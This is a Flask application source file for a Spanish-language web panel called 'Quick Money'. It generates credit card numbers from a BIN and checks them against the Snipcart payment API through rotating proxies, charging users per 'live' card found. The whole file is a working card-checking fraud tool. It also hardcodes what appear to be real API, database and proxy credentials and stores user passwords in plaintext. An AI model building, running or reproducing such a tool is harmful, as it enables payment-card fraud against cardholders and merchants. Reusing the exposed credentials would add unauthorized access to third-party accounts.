import os, random, time, json, requests, base64
from flask import Flask, render_template_string, request, redirect, session, url_for, jsonify
from pymongo import MongoClient

app = Flask(__name__)
app.secret_key = 'quick_money_v38_eternal_fixed'

# --- CONFIGURACIÓN MAESTRA ---
SNIPCART_SECRET = "ST_MDM2YTJlNjItNjBmYi00N2IyLWFjYWMtNDBkYjZmN2M2ODUzNjM5MDkwMzU3MzkyMjQ1NjA3"
MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# --- PROXIES DECODO ---
PROXY_USER = 'sp6jzqtaou'
PROXY_PASS = 'rUd7t65FxkK+x3Flhr'
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@gate.decodo.com:10001"
PROXIES_CONFIG = {'http': PROXY_URL, 'https': PROXY_URL}

try:
    client = MongoClient(MONGO_URI)
    db_mongo = client['quickmoney_db']
    usuarios_col = db_mongo['usuarios']
except Exception as e:
    print(f"Error: {e}")

COSTO_LIVE = 0.15

# --- MOTOR DE VALIDACIÓN ---
def check_gate_pro(cc):
    try:
        partes = cc.split('|')
        if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
        num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
        auth_str = base64.b64encode(f"{SNIPCART_SECRET}:".encode()).decode()
        headers = {"Authorization": f"Basic {auth_str}", "Content-Type": "application/json"}
        payload = {"paymentMethod": "CreditCard", "card": {"number": num, "expiryMonth": int(mes), "expiryYear": int(ano), "cvv": cvv}}
        
        response = requests.post('https://app.snipcart.com/api/paymentmethods/validate', json=payload, headers=headers, proxies=PROXIES_CONFIG, timeout=15)
        
        if response.status_code == 200:
            return {"status": "LIVE", "msg": "AUTHORIZED"}
        else:
            msg = response.json().get('message', 'DECLINED').upper()
            return {"status": "DEAD", "msg": msg}
    except:
        return {"status": "DEAD", "msg": "GATE REJECTED"}

CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
    :root { --gold: #c5a059; --bg: #000; --card: rgba(8, 8, 10, 0.98); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 10px; overflow-x: hidden; }
    #bg-canvas { position: fixed; top:0; left:0; width:100%; height:100%; z-index: -1; opacity: 0.5; }
    .container { max-width: 500px; margin: auto; padding-bottom: 50px; position: relative; z-index: 10; }
    .card { background: var(--card); border: 1px solid var(--border); padding: 25px; margin-bottom: 15px; border-radius: 4px; backdrop-filter: blur(10px); }
    .card-h { font-size: 11px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
    .admin-card { border: 1px solid var(--gold); background: rgba(197, 160, 89, 0.05); }
    input, textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; }
    .btn { border: none; padding: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
    .btn-gold { background: var(--gold); color: #000; }
    .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; margin-top: 5px; }
    .btn-mini { padding: 7px 12px; width: auto; font-size: 9px; margin-top: 0; }
    .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; }
    .live-item { border-bottom: 1px solid #111; padding: 10px 0; color: var(--green); }
</style>
"""

@app.route('/')
def login():
    if 'user' in session: return redirect(url_for('panel'))
    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:340px; text-align:center;"><h2>QUICK MONEY</h2><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register" style="color:var(--gold); font-size:10px; text-decoration:none;">[ CREAR CUENTA ]</a></div></div></body></html>')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
        if not usuarios_col.find_one({"u": u}):
            usuarios_col.insert_one({"u": u, "p": p, "saldo": 0.0, "rango": "USER", "telegram": t})
            return redirect(url_for('login'))
    return render_template_string(f'<html><head>{CSS}</head><body><div style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:340px; text-align:center;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold">REGISTRAR</button></form></div></div></body></html>')

@app.route('/panel', methods=['GET', 'POST'])
def panel():
    if 'user' not in session: return redirect(url_for('login'))
    u_name = session['user']
    u_data = usuarios_col.find_one({"u": u_name})
    is_admin = u_name.lower() == "mairo"
    display_id = "ADMIN" if is_admin else u_name.upper()

    return render_template_string(f"""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
    <body><canvas id="bg-canvas"></canvas><div class="container">
        <div style="display:flex; justify-content:space-between; align-items:center; margin: 30px 0;">
            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{display_id}</b></div>
            <div id="display_saldo" style="border:1px solid var(--gold); padding:8px 15px; color:var(--gold); font-weight:bold;">${u_data['saldo']:.2f}</div>
        </div>

        {" " if not is_admin else f'''
        <div class="card admin-card"><span class="card-h" style="color:var(--gold)">👑 CONTROL DE MANDO (ADMIN)</span>
            <form action="/admin_add_saldo" method="POST">
                <input name="target_user" placeholder="USUARIO A RECARGAR">
                <input name="amount" type="number" step="0.01" placeholder="CANTIDAD $">
                <button type="submit" class="btn btn-gold" style="padding:10px;">AÑADIR SALDO</button>
            </form>
        </div>
        '''}
        
        <div class="card"><span class="card-h">🪄 GENERADOR ÉLITE</span>
            <input id="bin_val" placeholder="BIN">
            <button class="btn btn-dark" onclick="generarCC()">GENERAR</button>
            <textarea id="gen_area" rows="3" readonly style="margin-top:10px; color:var(--gold); font-size:11px;"></textarea>
            <button class="btn btn-dark btn-mini" onclick="document.getElementById('check_list').value += document.getElementById('gen_area').value + '\\n'">➕ CARGAR</button>
        </div>

        <div class="card"><span class="card-h">🛡️ GATE PRO (REAL BANK)</span>
            <textarea id="check_list" rows="6" placeholder="LISTA CC|MM|YY|CVV"></textarea>
            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR ($0.15)</button>
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center;">
            <span style="color:var(--green); font-size:10px;">LIVES ✅</span>
            <button class="btn btn-dark btn-mini" onclick="downloadLives()">📥 DESCARGAR</button>
        </div>
        <div class="res-box" id="lives_log"></div>
        <div class="res-box" id="dead_log" style="opacity:0.5; margin-top:15px;"></div>

        <a href="/logout" style="color:#444; text-decoration:none; display:block; text-align:center; margin-top:40px; font-size:10px;">[ CERRAR SESIÓN ]</a>
    </div>
    <script>
    function generarCC() {{
        let bin = document.getElementById('bin_val').value;
        let cards = [];
        for(let i=0; i<10; i++) {{
            let res = bin; while(res.length < 16) res += Math.floor(Math.random()*10);
            cards.push(res + "|" + ("0" + (Math.floor(Math.random()*12) + 1)).slice(-2) + "|" + (2025 + Math.floor(Math.random()*6)) + "|" + Math.floor(Math.random()*899 + 100));
        }}
        document.getElementById('gen_area').value = cards.join('\\n');
    }}
    async function startChecking() {{
        let a = document.getElementById('check_list'); let l = a.value.trim().split('\\n');
        if(!l[0]) return; document.getElementById('btn_start').disabled = true;
        while(l.length > 0) {{
            let cc = l.shift(); a.value = l.join('\\n');
            let r = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc}})}});
            let d = await r.json();
            if(d.status === 'LIVE') {{
                document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
                document.getElementById('lives_log').innerHTML = '<div class="live-item">'+cc+' | '+d.msg+'</div>' + document.getElementById('lives_log').innerHTML;
            }} else {{
                document.getElementById('dead_log').innerHTML = cc + ' | ' + d.msg + '<br>' + document.getElementById('dead_log').innerHTML;
            }}
            await new Promise(r => setTimeout(r, 1200));
        }}
        document.getElementById('btn_start').disabled = false;
    }}
    </script></body></html>
    """)

@app.route('/admin_add_saldo', methods=['POST'])
def admin_add_saldo():
    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
    target = request.form.get('target_user')
    amount = float(request.form.get('amount', 0))
    usuarios_col.update_one({"u": target}, {"$inc": {"saldo": amount}})
    return redirect(url_for('panel'))

@app.route('/validar_card', methods=['POST'])
def validar():
    u_data = usuarios_col.find_one({"u": session['user']})
    if u_data['saldo'] < COSTO_LIVE: return jsonify({"status":"DEAD", "msg": "SIN SALDO"})
    cc = request.json.get('card', '')
    res = check_gate_pro(cc)
    if res['status'] == 'LIVE':
        new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
        usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
        return jsonify({"status": "LIVE", "nuevo_saldo": new_s, "msg": res['msg']})
    return jsonify({"status": "DEAD", "msg": res['msg']})

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('u'), request.form.get('p')
    if usuarios_col.find_one({"u": u, "p": p}): session['user'] = u
    return redirect(url_for('panel'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
